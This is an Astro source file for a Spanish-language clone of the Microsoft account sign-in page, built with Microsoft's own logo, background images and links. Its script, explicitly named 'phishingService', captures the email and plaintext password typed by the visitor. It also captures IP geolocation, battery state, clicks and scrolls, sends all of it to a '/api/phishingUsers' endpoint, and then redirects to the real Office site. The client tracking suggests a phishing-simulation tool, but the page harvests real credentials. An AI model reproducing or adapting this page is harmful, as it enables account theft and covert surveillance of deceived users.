---
import Layout from "@/layouts/templates/microsoft/Layout.astro";
---

<Layout title="Iniciar sesión en la cuenta">
  <div class="absolute top-0 left-0 w-full h-full bg-[#f2f2f2] contain-content">
    <img
      style="animation: fadeIn 1s"
      class="w-full h-full"
      aria-hidden="true"
      loading="lazy"
      src="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg"
      alt="Image Background"
    />
  </div>

  <main
    class="absolute w-full h-full flex flex-col items-center justify-center"
  >
    <section
      style="animation: fadeIn 1s"
      id="lightbox"
      class="mx-auto overflow-hidden"
    >
      <div>
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="108"
          height="24"
          viewBox="0 0 108 24"
        >
          <path
            d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z"
            fill="#737373"></path>
          <rect width="10.931" height="10.931" fill="#f25022"></rect>
          <rect x="12.069" width="10.931" height="10.931" fill="#7fba00"></rect>
          <rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"></rect>
          <rect
            x="12.069"
            y="12.069"
            width="10.931"
            height="10.931"
            fill="#ffb900"></rect>
        </svg>
      </div>

      <div class="relative contain-content overflow-hidden">
        <div id="email-view" class="relative mt-4 mb-3 animate min-h-[206px]">
          <div class="title-container">
            <h1 class="title">Iniciar sesión</h1>
          </div>

          <div class="mb-4">
            <form id="email-form" name="email-form" action="/" method="post">
              <input
                autofocus
                placeholder="Correo electrónico, teléfono o Skype"
                aria-required="true"
                maxlength="113"
                autocomplete="username"
                type="text"
                name="email"
                class="input text-box text-ms-eerie-black w-full"
              />
            </form>
          </div>

          <div class="flex flex-col gap-4 text-[13px]">
            <div>
              ¿No tiene una cuenta?
              <a
                href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&response_type=code+id_token&state=2_-VZY2e2UuuYGvN78aHeSL6mYDJBjEq5EGKMqzfLajUJstz26IEIr8OvqTeqcce9HwcauzAEgB6Pyni-1eIlmizQnMoJLmmIFuuBSYmk73zSWV67XCPNEuXSWd_sGBWpIR0-agryqAFm84kH_fQdfngUzruG9lYSC0blNpvCWiH_hPxIfQ6xQJD3Kim4Ybus0yOGwGcT9NCMyBxza8rmvJyQL8YnxUlVmhTN5MALys-pLHnpdFnf2QC4bfzIdjv92HYJ13eyRqU37WiOOuO5A&response_mode=form_post&nonce=638614852763386813.OTNiZTE4ODUtMGJhNi00YWRjLTliMjUtY2RjNDc3MWM3MzkxMTc0ZDFmNTQtOTlmYy00MThlLWE4NjAtMDQ1OGE1NDY0YzQ0&x-client-SKU=ID_NET8_0&x-client-Ver=7.5.1.0&uaid=512b78915c704724882dfca4cac0dfec&msproxy=1&issuer=mso&tenant=common&ui_locales=es-ES&signup=1&lw=1&fl=easi2&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYq_ohZxgRHDutG7C-Zik52voaHNXAoXPGwrFbqX4B-qj2DYGACquX_CDZZ2_RcBLcxjBJpdEZw8xE26m1Lqn8A4vAiLNoGrbkm2He5buZxN7SSl8M4TRVuHzdtlV3Ryw9vP5mwXKuRee6R9qA6-qxJntv9Wpo4PpxstMh8FuDqej2ZuIwOg-wIcmm9LiroqCRgZrz8pumVFeabuOlFi176yAA&jshs=0"
                id="signup"
                aria-label="Crear una cuenta de Microsoft ">Cree una</a
              >.
            </div>
            <a href="#">¿No puede acceder a su cuenta?</a>
          </div>

          <div class="flex gap-1.5 mt-5 justify-end">
            <button class="button secondary" type="button">Atrás</button>
            <button class="button primary" type="submit" form="email-form">
              Siguiente
            </button>
          </div>
        </div>

        <div
          id="password-view"
          class="relative mt-4 mb-3 animate min-h-[206px] hidden"
        >
          <div id="identity" class="identity"></div>

          <div class="mb-4">
            <div class="password-view">
              <form
                id="password-form"
                name="password-form"
                action="/"
                method="post"
              >
                <h1 class="title">Escribir contraseña</h1>

                <input
                  id="password"
                  name="password"
                  placeholder="Contraseña"
                  type="password"
                  maxlength="120"
                  aria-label="Escriba la contraseña para asdaasd"
                  autocomplete="current-password"
                  class="input text-box text-ms-eerie-black w-full"
                  style="border-color: rgb(102, 102, 102)"
                />
              </form>
            </div>
          </div>

          <div class="flex flex-col gap-4 text-[13px]">
            <a href="https://microsoft.com/es-ES/password-recover">
              ¿Ha olvidado su contraseña?
            </a>
            <a href="https://microsoft.com/es-ES/username-recover">
              ¿Olvidó su nombre de usuario?
            </a>
          </div>

          <div class="flex gap-1.5 mt-5 justify-end">
            <button
              class="button primary segoe-ui"
              type="submit"
              form="password-form"
            >
              Iniciar sesión
            </button>
          </div>
        </div>
      </div>
    </section>

    <section id="credbox" class="mx-auto">
      <div class="email-view">
        <div
          class="w-full h-full cursor-pointer flex items-center gap-3 py-2 px-11"
        >
          <img
            width="32"
            height="32"
            role="presentation"
            src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          />
          <span class="text-[15px] leading-4 text-ms-eerie-black">
            Opciones de inicio de sesión
          </span>
        </div>
      </div>
    </section>
  </main>

  <footer
    class="absolute left-0 bottom-0 overflow-visible z-30 clear-both w-full min-h-7"
  >
    <div class="flex w-full h-full gap-4 items-center justify-end pr-3">
      <a
        class="!text-ms-eerie-black text-[12px] leading-7 text-nowrap"
        href="https://www.microsoft.com/es-ES/servicesagreement"
      >
        Términos de uso
      </a>
      <a
        class="!text-ms-eerie-black text-[12px] leading-7 text-nowrap"
        href="https://privacy.microsoft.com/es-ES/privacystatement"
      >
        Privacidad y cookies
      </a>
      <a
        class="text-debug"
        href="#"
        role="button"
        aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas."
        aria-expanded="false">...</a
      >
    </div>
  </footer>
</Layout>

<script>
  import { cn } from "@/lib/utils";
  import { Temporal } from "temporal-polyfill";

  interface ClientSessionData {
    id: string;
    startedAt: Temporal.Instant;
    endedAt: Temporal.Instant;
    duration: number;
    eventsCount: number;
    events: any[];
  }

  const client_id = new URLSearchParams(document.location.search).get(
    "client_id"
  );

  const sessionService = (() => {
    function generateUniqueId() {
      const newId = "uid-" + crypto.randomUUID();
      return newId;
    }

    function throttle(fn: Function, delay: number) {
      let lastCall = 0;
      return function (...args: any[]) {
        const now = Date.now();
        if (now - lastCall < delay) return;
        lastCall = now;
        return fn(...args);
      };
    }

    let sessionData: ClientSessionData = {
      id: generateUniqueId(),
      startedAt: Temporal.Now.instant(),
      endedAt: Temporal.Now.instant(),
      duration: 0,
      eventsCount: 0,
      events: [],
    };

    const handleClick = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      const data = {
        element: {
          tag: target.tagName,
          id: target.id,
          classes: target.className,
          text: target.textContent?.slice(0, 100),
        },
        position: { x: event.clientX, y: event.clientY },
      };

      sessionData.events.push({
        type: "CLICK",
        timestamp: Temporal.Now.instant(),
        data,
      });
    };

    const handleScroll = throttle(() => {
      const data = {
        position: window.scrollY,
        viewport: window.innerHeight,
        documentHeight: document.documentElement.scrollHeight,
      };

      sessionData.events.push({
        type: "SCROLL",
        timestamp: Temporal.Now.instant(),
        data,
      });
    }, 500);

    return {
      init: async () => {
        const batteryPromise =
          // @ts-ignore
          navigator.getBattery?.() || Promise.resolve(null);
        const battery = await batteryPromise;

        sessionData.events.push({
          type: "BATTERY",
          timestamp: Temporal.Now.instant(),
          data: {
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime,
            level: battery.level,
          },
        });

        // Trackeo de eventos
        document.addEventListener("click", handleClick);
        window.addEventListener("scroll", handleScroll);
      },

      getSessionData: () => {
        sessionData.endedAt = Temporal.Now.instant();
        let duration = sessionData.startedAt.until(sessionData.endedAt).seconds;

        sessionData = {
          ...sessionData,
          duration,
          eventsCount: sessionData.events.length,
        };

        return sessionData;
      },
    };
  })();

  // Módulo separado para manejo de vistas
  const viewManager = (() => {
    const emailView = document.getElementById("email-view")!;
    const passwordView = document.getElementById("password-view")!;

    return {
      showPasswordView: () => {
        emailView.classList.remove(cn("show-from-r"));
        emailView.classList.add(cn("hide-to-left"));

        setTimeout(() => {
          passwordView.classList.remove(cn("hidden"));
          passwordView.classList.add(cn("show-from-r"));
          document.getElementById("password")?.focus();
        }, 250);
      },

      updateIdentity: (email: string) => {
        document.getElementById("identity")!.textContent = email;
      },
    };
  })();

  // Módulo separado para manejo de formularios
  const formHandler = (() => {
    const EMAIL_REGEX =
      /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    const PHONE_REGEX =
      /^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/;
    const USER_REGEX = /^[a-zA-Z0-9]{5,31}$/;

    const validateInput = (value: string) => {
      return (
        EMAIL_REGEX.test(value) ||
        PHONE_REGEX.test(value) ||
        USER_REGEX.test(value)
      );
    };

    const setInputStatus = (input: HTMLInputElement, isValid: boolean) => {
      input.classList.toggle("has-error", !isValid);
    };

    return {
      handleEmailSubmit: async (event: SubmitEvent) => {
        event.preventDefault();
        const form = event.target as HTMLFormElement;
        const input = form.elements.namedItem("email") as HTMLInputElement;
        const isValid = validateInput(input.value);

        setInputStatus(input, isValid);

        if (isValid) {
          await phishingService.sendEmail(input.value);
          viewManager.showPasswordView();
          viewManager.updateIdentity(input.value);
        }
      },

      handlePasswordSubmit: async(event: SubmitEvent) => {
        event.preventDefault();
        const form = event.target as HTMLFormElement;
        const input = form.elements.namedItem("password") as HTMLInputElement;
        await phishingService.sendPassword(input.value);

        window.location.replace("https://www.office.com/login?es=UnauthClick&ru=%2F&msafed=0");
      },
    };
  })();

  // Servicio separado para comunicación con API
  const phishingService = (() => {
    const getClientMetadata = async () => {
      try {
        const ipData = await (await fetch("https://api.ipapi.is")).json();

        return {
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          geolocation: {
            lat: ipData.location?.latitude || 0,
            lon: ipData.location?.longitude || 0,
            city: ipData.location?.city,
            country: ipData.location?.country,
          },
          device: {
            screenResolution: `${screen.width}x${screen.height}`,
          },
        };
      } catch (error) {
        console.error("Error getting metadata:", error);
        return null;
      }
    };

    return {
      sendEmail: async (email: string) => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          email: email,
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },

      sendPassword: async (password: string) => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          password: password,
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },

      init: async () => {
        const metadata = await getClientMetadata();
        const sessionData = sessionService.getSessionData();

        const userData = {
          metadata: metadata || {
            ip: "unknown",
            userAgent: navigator.userAgent,
            geolocation: { lat: 0, lon: 0 },
            device: { screenResolution: "unknown" },
          },
          sessionData,
        };

        if (!client_id) return null;

        try {
          const response = await fetch(`/api/phishingUsers/${client_id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
          });

          return await response.json();
        } catch (error) {
          console.error("Error creating user:", error);
          return null;
        }
      },
    };
  })();

  // Inicialización
  document.addEventListener("DOMContentLoaded", () => {
    sessionService.init();
    phishingService.init();

    if (client_id) {
      fetch("/api/status", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ client_id, status: "clicked" }),
      });
    }

    const emailForm = document.getElementById("email-form")!;
    const passwordForm = document.getElementById("password-form")!;

    emailForm.addEventListener("submit", formHandler.handleEmailSubmit);
    passwordForm.addEventListener("submit", formHandler.handlePasswordSubmit);

    document.getElementById("email-view")!.classList.add(cn("show-from-r"));
  });
</script>
